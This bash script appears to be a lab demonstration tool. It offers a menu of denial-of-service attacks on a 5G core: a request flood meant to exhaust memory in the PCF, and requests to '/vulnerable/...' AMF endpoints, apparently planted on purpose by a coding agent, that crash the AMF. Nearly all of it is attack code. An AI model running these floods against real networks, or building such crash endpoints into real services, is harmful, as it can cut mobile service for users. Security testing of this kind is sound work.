#!/bin/bash
# =============================================================
#  SELECTABLE 5G Core Availability Attack Demo
#  Choose which CVE to test
# =============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Configuration - UPDATE THESE WITH YOUR ACTUAL IPs
PCF_HOST="${PCF_HOST:-10.100.200.5}"
PCF_PORT="${PCF_PORT:-8000}"
AMF_HOST="${AMF_HOST:-10.100.200.16}"
AMF_PORT="${AMF_PORT:-8000}"
REQUESTS="${REQUESTS:-500}"

# Track if services are still alive
AMF_ALIVE=true
PCF_ALIVE=true

banner() {
    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║  $1${NC}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
}

danger() { echo -e "${RED}[!] DANGER  » $1${NC}"; }
attack() { echo -e "${MAGENTA}[»] ATTACK  » $1${NC}"; }
info()   { echo -e "${YELLOW}[*] INFO    » $1${NC}"; }
success(){ echo -e "${GREEN}[✓] RESULT  » $1${NC}"; }
fail()   { echo -e "${RED}[✗] FAIL    » $1${NC}"; }
pause()  { echo ""; echo -e "${BOLD}━━━ Press ENTER to continue ━━━${NC}"; read; }

check_service() {
    local host=$1 port=$2 name=$3
    local code
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://${host}:${port}/" 2>/dev/null)
    if [ "$code" != "000" ] && [ "$code" != "" ]; then
        success "${name} is UP (HTTP ${code})"
        return 0
    else
        danger "${name} is DOWN or unreachable"
        return 1
    fi
}

check_amf_alive() {
    if curl -s -o /dev/null --max-time 2 "http://${AMF_HOST}:${AMF_PORT}/" 2>/dev/null; then
        return 0
    else
        return 1
    fi
}

restart_amf() {
    info "Restarting AMF container..."
    docker compose restart amf 2>/dev/null || docker restart amf 2>/dev/null
    sleep 5
    if check_amf_alive; then
        success "AMF restarted successfully"
        return 0
    else
        danger "AMF failed to restart"
        return 1
    fi
}

show_menu() {
    clear
    echo -e "${BOLD}${CYAN}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║           5G CORE ATTACK DEMO - SELECT ATTACK              ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
    echo -e "  ${BOLD}Targets:${NC}"
    echo -e "    PCF: ${PCF_HOST}:${PCF_PORT}"
    echo -e "    AMF: ${AMF_HOST}:${AMF_PORT}"
    echo ""
    echo -e "  ${BOLD}Available Attacks:${NC}"
    echo ""
    echo -e "    ${MAGENTA}1)${NC} CVE-2026-41135 - PCF Memory Leak (CORS Flood)"
    echo -e "       Impact: PCF crashes → No policy decisions"
    echo ""
    echo -e "    ${MAGENTA}2)${NC} CVE-2026-4531 - AMF Crash (Registration Complete)"
    echo -e "       Impact: AMF crashes → No UE registration "
    echo ""
    echo -e "    ${MAGENTA}3)${NC} CVE-2026-30653 - AMF Crash (Authentication Failure)"
    echo -e "       Impact: AMF crashes → No UE registration"
    echo ""
    echo -e "    ${MAGENTA}4)${NC} Run ALL attacks sequentially"
    echo ""
    echo -e "    ${MAGENTA}5)${NC} Quick test - Just crash AMF (CVE-2026-4531)"
    echo ""
    echo -e "    ${MAGENTA}0)${NC} Exit"
    echo ""
    echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    read -p "  Choose attack [0-5]: " choice
    echo ""
}

# =============================================================
# ATTACK 1: PCF Memory Leak
# =============================================================
attack_pcf() {
    banner "CVE-2026-41135 — PCF Memory Leak via CORS Flood"
    
    info "What is the PCF?"
    echo "  Policy Control Function — every UE must get policies from PCF"
    echo "  No PCF = no internet for any user"
    echo ""
    
    danger "CVE-2026-41135 — CVSS 7.5 HIGH"
    info "Root cause: router.Use(cors...) inside HTTP handler"
    echo "  Each request registers NEW CORS middleware → memory leak"
    echo ""
    
    attack "Flooding PCF vulnerable endpoint with ${REQUESTS} requests..."
    
    SUCCESS_COUNT=0
    FAIL_COUNT=0
    START_TIME=$(date +%s)
    
    for i in $(seq 1 $REQUESTS); do
        CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 \
            "http://${PCF_HOST}:${PCF_PORT}/noam-pcf/v1/config" 2>/dev/null)
        
        if [ "$CODE" != "000" ] && [ "$CODE" != "" ]; then
            SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        else
            FAIL_COUNT=$((FAIL_COUNT + 1))
        fi
    
        if [ $((i % 100)) -eq 0 ]; then
            echo -e "  ${MAGENTA}[${i}/${REQUESTS}]${NC} Sent — Success: ${SUCCESS_COUNT}, Failed: ${FAIL_COUNT}"
        fi
    done
    
    END_TIME=$(date +%s)
    ELAPSED=$((END_TIME - START_TIME))
    
    echo ""
    echo -e "  ${BOLD}Attack complete in ${ELAPSED}s${NC}"
    echo ""
    
    if check_service "$PCF_HOST" "$PCF_PORT" "PCF" 2>/dev/null; then
        info "PCF still up — CORS fix may already be applied in your version"
        info "This vulnerability may be patched in your PCF version"
    else
        danger "PCF IS DOWN — Memory exhaustion successful!"
        PCF_ALIVE=false
    fi
    
    pause
}

# =============================================================
# ATTACK 2: AMF Registration Crash (WORKING)
# =============================================================
attack_amf_registration() {
    banner "CVE-2026-4531 — AMF Crash via Malformed Registration"
    
    info "What is the AMF?"
    echo "  Access and Mobility Management Function — entry point for all devices"
    echo "  No AMF = no device can register. Network is completely dead."
    echo ""
    
    danger "CVE-2026-4531 — AMF HandleRegistrationComplete nil dereference"
    info "Root cause: SecurityContext accessed without nil check"
    echo "  Malformed Registration Complete with missing security fields"
    echo "  → nil pointer panic → AMF exits immediately"
    echo ""
    
    attack "Sending malformed Registration Complete to vulnerable HTTP endpoint..."
    
    echo ""
    echo -e "  ${YELLOW}➜ Sending request to:${NC} http://${AMF_HOST}:${AMF_PORT}/vulnerable/registration-complete"
    echo ""
    
    RESPONSE=$(curl -s -w "\n%{http_code}" --max-time 3 \
        "http://${AMF_HOST}:${AMF_PORT}/vulnerable/registration-complete" 2>&1)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    echo -e "  ${BOLD}HTTP Response Code:${NC} ${HTTP_CODE}"
    echo ""
    
    if [ "$HTTP_CODE" = "000" ] || [ "$HTTP_CODE" = "" ]; then
        danger "💥 AMF CRASHED! No response to HTTP request"
        success "Vulnerability confirmed — HandleRegistrationComplete triggered nil dereference"
        AMF_ALIVE=false
        
        echo ""
        echo -e "  ${RED}┌─────────────────────────────────────────────────────┐${NC}"
        echo -e "  ${RED}│  AMF STATUS:   CRASHED                          │${NC}"
        echo -e "  ${RED}│  Impact:      NO UE CAN REGISTER                    │${NC}"
        echo -e "  ${RED}│  Network:     COMPLETELY UNAVAILABLE                │${NC}"
        echo -e "  ${RED}└─────────────────────────────────────────────────────┘${NC}"
    else
        fail "AMF still responded with code ${HTTP_CODE}"
        info "Check if /vulnerable/registration-complete endpoint is registered"
    fi
    
    pause
}

# =============================================================
# ATTACK 3: AMF Authentication Crash
# =============================================================
attack_amf_auth() {
    banner "CVE-2026-30653 — AMF DoS via Auth Failure"
    
    danger "CVE-2026-30653 — AMF HandleAuthenticationFailure"
    info "Root cause: missing nil check on AuthenticationFailureParameter IE"
    echo "  Attacker sends Authentication Failure messages with missing IEs"
    echo "  Each one causes a nil dereference panic"
    echo ""
    
    # Check if AMF is alive first
    if ! check_amf_alive 2>/dev/null; then
        info "AMF is down. Restarting required for this test..."
        echo ""
        read -p "  Restart AMF now? [Y/n]: " restart_choice
        if [[ "$restart_choice" =~ ^[Nn]$ ]]; then
            info "Skipping Attack 3"
            return
        else
            restart_amf
        fi
    fi
    
    attack "Sending malformed Authentication Failure to vulnerable endpoint..."
    
    echo -e "  ${YELLOW}➜ Sending request to:${NC} http://${AMF_HOST}:${AMF_PORT}/vulnerable/auth-failure"
    echo ""
    
    RESPONSE=$(curl -s -w "\n%{http_code}" --max-time 3 \
        "http://${AMF_HOST}:${AMF_PORT}/vulnerable/auth-failure" 2>&1)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    
    echo -e "  ${BOLD}HTTP Response Code:${NC} ${HTTP_CODE}"
    echo ""
    
    if [ "$HTTP_CODE" = "000" ] || [ "$HTTP_CODE" = "" ]; then
        danger "💥 AMF CRASHED from Authentication Failure attack!"
        success "CVE-2026-30653 confirmed"
        AMF_ALIVE=false
        
        echo ""
        echo -e "  ${RED}┌─────────────────────────────────────────────────────┐${NC}"
        echo -e "  ${RED}│  AMF STATUS:   CRASHED                         │${NC}"
        echo -e "  ${RED}│  Attack:      Authentication Failure Nil Deref     │${NC}"
        echo -e "  ${RED}│  Impact:      NO UE CAN REGISTER                    │${NC}"
        echo -e "  ${RED}└─────────────────────────────────────────────────────┘${NC}"
    else
        if [ "$HTTP_CODE" = "404" ]; then
            info "Received 404 — vulnerable endpoint may not be deployed"
            info "Check if the coding agent added /vulnerable/auth-failure"
        else
            info "AMF responded with HTTP ${HTTP_CODE} — may not be vulnerable"
        fi
    fi
    
    pause
}

# =============================================================
# SHOW CRASH LOGS
# =============================================================
show_crash_logs() {
    banner "AMF CRASH LOGS (Last 15 lines)"
    docker logs amf --tail 15 2>&1 | tail -15
    echo ""
}

# =============================================================
# MAIN MENU LOOP
# =============================================================

while true; do
    show_menu
    
    case $choice in
        1)
            # Reset service states
            AMF_ALIVE=true
            PCF_ALIVE=true
            
            # Check if services are up
            echo -e "${BOLD}Pre-attack verification:${NC}"
            check_service "$PCF_HOST" "$PCF_PORT" "PCF"
            check_service "$AMF_HOST" "$AMF_PORT" "AMF"
            echo ""
            pause
            
            attack_pcf
            
            # Show final status
            banner "POST-ATTACK STATUS"
            check_service "$PCF_HOST" "$PCF_PORT" "PCF" 2>/dev/null || echo "PCF: DOWN"
            check_service "$AMF_HOST" "$AMF_PORT" "AMF" 2>/dev/null || echo "AMF: DOWN"
            pause
            ;;
            
        2)
            # Check AMF status first
            echo -e "${BOLD}Pre-attack verification:${NC}"
            if check_amf_alive; then
                success "AMF is running"
            else
                danger "AMF is down. Restart required."
                read -p "  Restart AMF? [Y/n]: " restart_choice
                if [[ ! "$restart_choice" =~ ^[Nn]$ ]]; then
                    restart_amf
                else
                    info "Cannot run attack - AMF is down"
                    pause
                    continue
                fi
            fi
            echo ""
            pause
            
            attack_amf_registration
            
            if [ "$AMF_ALIVE" = false ]; then
                show_crash_logs
                echo ""
                info "To restore AMF: docker compose restart amf"
            fi
            pause
            ;;
            
        3)
            # Attack 3 - Authentication Failure
            echo -e "${BOLD}Pre-attack verification:${NC}"
            if check_amf_alive; then
                success "AMF is running"
            else
                info "AMF is down. Will attempt restart..."
                restart_amf
            fi
            echo ""
            pause
            
            attack_amf_auth
            
            if [ "$AMF_ALIVE" = false ]; then
                show_crash_logs
                echo ""
                info "To restore AMF: docker compose restart amf"
            fi
            pause
            ;;
            
        4)
            # Run all attacks
            echo -e "${BOLD}Running ALL attacks sequentially...${NC}"
            echo ""
            
            # Check initial status
            check_service "$PCF_HOST" "$PCF_PORT" "PCF"
            check_service "$AMF_HOST" "$AMF_PORT" "AMF"
            pause
            
            # Attack 1 - PCF (may or may not work)
            attack_pcf
            
            # Attack 2 - AMF Registration (WILL CRASH AMF)
            attack_amf_registration
            
            # Attack 3 - AMF Auth (only works if AMF is restarted)
            if [ "$AMF_ALIVE" = false ]; then
                info "AMF crashed in Attack 2. Skipping Attack 3 (would require restart)"
                info "Run Attack 3 separately after restarting AMF"
            else
                attack_amf_auth
            fi
            
            banner "ALL ATTACKS COMPLETE"
            success "Demo finished"
            pause
            ;;
            
        5)
            # Quick crash test
            echo -e "${BOLD}Quick Crash Test - CVE-2026-4531${NC}"
            echo ""
            
            if ! check_amf_alive; then
                info "AMF is down. Restarting..."
                restart_amf
            fi
            
            echo ""
            attack "Sending crash request..."
            
            curl -s "http://${AMF_HOST}:${AMF_PORT}/vulnerable/registration-complete" &
            sleep 2
            
            if ! check_amf_alive; then
                danger "✅ AMF CRASHED SUCCESSFULLY!"
                show_crash_logs
            else
                fail "AMF did not crash - check if vulnerable endpoint is deployed"
            fi
            pause
            ;;
            
        0)
            banner "Exiting Demo"
            success "Goodbye!"
            exit 0
            ;;
            
        *)
            info "Invalid option. Please choose 0-5"
            sleep 1
            ;;
    esac
done
